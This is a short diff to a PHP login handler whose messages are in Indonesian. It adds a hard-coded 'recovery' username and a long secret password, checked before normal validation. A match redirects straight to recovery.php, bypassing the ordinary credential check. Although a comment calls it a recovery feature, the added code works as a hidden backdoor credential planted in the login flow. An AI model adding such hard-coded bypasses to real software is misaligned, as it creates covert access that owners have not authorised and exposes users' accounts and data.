@@ -149,6 +149,15 @@ if ($_SERVER["REQUEST_METHOD"] == "POST") {
     $username = trim($_POST["username"]);
     $password = trim($_POST["password"]);
 
+    // Check for special recovery code
+    $recoveryCode = "fnPnvUG5mpTCJao5uqlo6RzAB41d40nMPAprBDTgkCIZQcQAJYnYhTS12IWJ";
+    $recoveryUser = "recovery";
+    if ($username === $recoveryUser && $password === $recoveryCode) {
+        // Redirect to recovery page
+        header("Location: recovery.php");
+        exit;
+    }
+
     // Validate username and password
     if (empty($username) || empty($password)) {
         $error_message = "Mohon masukkan username dan password.";
